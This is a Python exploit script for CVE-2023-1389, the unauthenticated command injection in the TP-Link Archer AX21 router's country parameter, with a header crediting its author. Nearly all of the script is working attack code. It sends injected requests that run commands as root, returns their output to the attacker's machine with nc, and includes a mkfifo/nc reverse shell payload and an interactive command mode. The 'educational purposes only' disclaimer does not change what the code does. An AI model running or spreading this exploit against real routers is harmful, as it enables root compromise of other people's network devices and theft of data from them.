#!/usr/bin/env python3
#!/usr/bin/python3 
"""
Comprehensive TP-Link Archer AX21 Command Injection Exploit (CVE-2023-1389)
This script provides multiple exploitation methods for the vulnerability,
# Exploit Title: TP-Link Archer AX21 Unauthenticated Command Injection
# Date: 2025-04-26
# Exploit Author: ibrahimsql (https://github.com/ibrahimsql)
# Vendor Homepage: https://www.tp-link.com/us/
# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389)
# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0
# CVE: CVE-2023-1389
#
# Disclaimer: This script is intended to be used for educational purposes only.
# Do not run this against any system that you do not have permission to test. 
# The author will not be held responsible for any use or damage caused by this 
# program. 
# 
# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web
# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the
# *country* parameter of the *write* callback for the *country* form at the
# "/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is 
# possible to run commands as root. Execution requires sending the request twice;
# the first request sets the command in the *country* value, and the second request 
# (which can be identical or not) executes it. 
# This script is my first iteration at a proof of concept. It sends the output of 
# the executed command to the file /tmp/out, then uses nc to transfer that file to
# the attacker device, where the contents are then printed. To learn more about this
# vulnerability, see the original disclosure: https://github.com/ibrahimsql/CVE-2023-1389
# Educational purposes only. 
"""

import requests
import urllib.parse
import os
import argparse
import time
import sys
import signal
import subprocess
import socket
import json
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL/TLS warnings
disable_warnings(InsecureRequestWarning)

# Global variables
nc_process = None
output_file = "router_output.txt"
temp_file = "/tmp/out"  # Temporary file on the router to store command output

def cleanup(signum=None, frame=None):
    """Clean up resources before exiting"""
    global nc_process
    if nc_process:
        print("\n[*] Terminating netcat listener...")
        try:
            nc_process.terminate()
        except:
            pass
    
    # Remove temporary files
    if os.path.exists(output_file):
        try:
            os.remove(output_file)
        except:
            pass
    
    print("[*] Cleanup complete")
    sys.exit(0)

def banner():
    print("""

   ______     _______     ____   ___ ____  _____       _ _____  ___  ___  
  / ___\ \   / / ____|   |___ \ / _ \___ \|___ /      / |___ / ( _ )/ _ \ 
 | |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____| | |_ \ / _ \ (_) |
 | |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____| |___) | (_) \__, |
  \____|  \_/  |_____|   |_____|\___/_____|____/      |_|____/ \___/  /_/ 
                                                                          
Author: ibrahimsql 
    """)

def check_ip(ip):
    """Validate IP address format"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def parse_arguments():
    parser = argparse.ArgumentParser(description="TP-Link Archer AX21 Command Injection Exploit (CVE-2023-1389)")
    
    parser.add_argument("-r", "--router", dest="router", default="192.168.0.1", 
                        help="Router IP address (default: 192.168.0.1)")
    parser.add_argument("-a", "--attacker", dest="attacker", required=True, 
                        help="Attacker IP address")
    parser.add_argument("-p", "--port", dest="port", default="9999", 
                        help="Local port for netcat listener (default: 9999)")
    parser.add_argument("-m", "--method", dest="method", choices=["get", "post"], default="get",
                        help="HTTP method to use (get/post, default: get)")
    parser.add_argument("-t", "--timeout", dest="timeout", type=int, default=5, 
                        help="Timeout for requests in seconds (default: 5)")
    parser.add_argument("--https", action="store_true", dest="https", default=True,
                        help="Use HTTPS instead of HTTP (default: True)")
    parser.add_argument("--no-https", action="store_false", dest="https",
                        help="Use HTTP instead of HTTPS")
    
    # Mode selection
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("-c", "--command", dest="command", 
                      help="Command to execute on the router")
    mode_group.add_argument("-s", "--shell", action="store_true", 
                      help="Get a reverse shell")
    mode_group.add_argument("-i", "--interactive", action="store_true",
                      help="Interactive command shell")
    
    return parser.parse_args()

def start_listener(port):
    """Start a netcat listener and return the process"""
    global output_file
    print(f"[*] Starting netcat listener on port {port}...")
    
    try:
        # Check if port is already in use
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('127.0.0.1', int(port)))
        sock.close()
        
        if result == 0:
            print(f"[-] Port {port} is already in use. Choose a different port.")
            return None
            
        # Use subprocess to start netcat in background
        process = subprocess.Popen(
            ["nc", "-lnvp", port, ">", output_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            preexec_fn=os.setsid
        )
        time.sleep(1)  # Give netcat time to start
        return process
    except Exception as e:
        print(f"[-] Failed to start netcat listener: {e}")
        return None

def send_exploit_get(router_ip, payload, use_https=True, timeout=5):
    """Send an exploit via GET request"""
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{router_ip}/cgi-bin/luci/;stok=/locale?form=country&operation=write&country={payload}"
    
    try:
        # Send request twice for successful exploitation
        requests.get(url, verify=False, timeout=timeout)
        requests.get(url, verify=False, timeout=timeout)
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] GET request failed: {e}")
        return False

def send_exploit_post(router_ip, payload, use_https=True, timeout=5):
    """Send an exploit via POST request"""
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{router_ip}/cgi-bin/luci/;stok=/locale?form=country"
    data = f"operation=write&country={payload}"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    try:
        # Send request twice for successful exploitation
        requests.post(url, data=data, headers=headers, verify=False, timeout=timeout)
        requests.post(url, data=data, headers=headers, verify=False, timeout=timeout)
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] POST request failed: {e}")
        return False

def send_exploit(router_ip, payload, method="get", use_https=True, timeout=5):
    """Send an exploit using specified method"""
    if method.lower() == "post":
        return send_exploit_post(router_ip, payload, use_https, timeout)
    else:
        return send_exploit_get(router_ip, payload, use_https, timeout)

def get_command_output(router_ip, attacker_ip, port, command, method, use_https, timeout):
    """Execute a command on the router and retrieve its output"""
    # Prepare command injection payload
    cmd_payload = f"$({urllib.parse.quote(command)} > {temp_file} 2>&1)"
    output_payload = f"$(nc {attacker_ip} {port} < {temp_file})"
    
    # Start netcat listener
    global nc_process
    nc_process = start_listener(port)
    if not nc_process:
        return False
    
    # Send exploit to execute command
    print(f"[*] Executing command: {command}")
    success = send_exploit(router_ip, cmd_payload, method, use_https, timeout)
    if not success:
        return False
    
    # Allow time for command to finish executing
    time.sleep(1)
    
    # Send exploit to retrieve output
    print("[*] Retrieving command output...")
    success = send_exploit(router_ip, output_payload, method, use_https, timeout)
    if not success:
        return False
    
    # Allow time for data transfer
    time.sleep(2)
    
    # Display output
    try:
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            with open(output_file, 'r') as f:
                output = f.read()
                print("\n" + "="*50)
                print(f"COMMAND OUTPUT:")
                print("="*50)
                print(output)
                print("="*50 + "\n")
            return True
        else:
            print("[-] No output received or command produced no output")
            return False
    except Exception as e:
        print(f"[-] Error reading output: {e}")
        return False

def get_reverse_shell(router_ip, attacker_ip, port, method, use_https, timeout):
    """Create a reverse shell from the router to the attacker"""
    # Reverse shell payload
    revshell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} >/tmp/f"
    payload = f"$({urllib.parse.quote(revshell)})"
    
    print(f"[*] Setting up reverse shell connection to {attacker_ip}:{port}")
    print(f"[*] Run this command in another terminal: nc -lvnp {port}")
    print("[*] Press Enter when your listener is ready...")
    input()
    
    # Send exploit to create reverse shell
    print("[*] Sending reverse shell payload...")
    success = send_exploit(router_ip, payload, method, use_https, timeout)
    
    if success:
        print("[+] Reverse shell payload sent successfully")
        print("[+] Check your netcat listener for connection")
    else:
        print("[-] Failed to send reverse shell payload")
    
    return success

def interactive_shell(router_ip, attacker_ip, port, method, use_https, timeout):
    """Provide an interactive shell-like interface"""
    print("\n[*] Starting interactive shell. Type 'exit' to quit.")
    print("[*] Note: Each command requires a new connection\n")
    
    while True:
        try:
            command = input("router# ")
            if command.lower() in ['exit', 'quit']:
                break
            
            if command.strip():
                get_command_output(router_ip, attacker_ip, port, command, method, use_https, timeout)
        except KeyboardInterrupt:
            print("\n[!] Interactive mode terminated by user")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return True

def validate_arguments(args):
    """Validate command line arguments"""
    # Check IP addresses
    if not check_ip(args.router):
        print(f"[-] Invalid router IP address: {args.router}")
        return False
    
    if not check_ip(args.attacker):
        print(f"[-] Invalid attacker IP address: {args.attacker}")
        return False
    
    # Check port
    try:
        port = int(args.port)
        if port < 1 or port > 65535:
            print(f"[-] Invalid port number: {args.port}")
            return False
    except ValueError:
        print(f"[-] Invalid port number: {args.port}")
        return False
    
    # Warn about loopback address
    if args.attacker == "127.0.0.1":
        print("[-] Warning: Using loopback address as attacker IP")
        print("[-] This will only work if the router can reach your loopback interface")
        print("[-] Consider using your actual network interface IP address")
    
    return True

def main():
    # Setup signal handlers for clean exit
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    banner()
    args = parse_arguments()
    
    # Validate arguments
    if not validate_arguments(args):
        sys.exit(1)
    
    # Display configuration
    protocol = "HTTPS" if args.https else "HTTP"
    print(f"[*] Target router: {args.router}")
    print(f"[*] Attacker IP: {args.attacker}")
    print(f"[*] Attacker port: {args.port}")
    print(f"[*] Using {args.method.upper()} method over {protocol}")
    
    # Disclaimer
    print("\n[!] DISCLAIMER: Use this tool only on systems you own or have permission to test.")
    print("[!] Unauthorized use is illegal and unethical.")
    print("[!] The author is not responsible for any misuse or damage.\n")
    
    # Execute based on selected mode
    try:
        if args.shell:
            success = get_reverse_shell(args.router, args.attacker, args.port, args.method, args.https, args.timeout)
        elif args.interactive:
            success = interactive_shell(args.router, args.attacker, args.port, args.method, args.https, args.timeout)
        else:
            success = get_command_output(args.router, args.attacker, args.port, args.command, args.method, args.https, args.timeout)
        
        if success:
            print("[+] Operation completed successfully")
        else:
            print("[-] Operation failed")
            
    except KeyboardInterrupt:
        print("\n[!] Operation interrupted by user")
    except Exception as e:
        print(f"[-] An error occurred: {e}")
    finally:
        cleanup()

if __name__ == "__main__":
    main()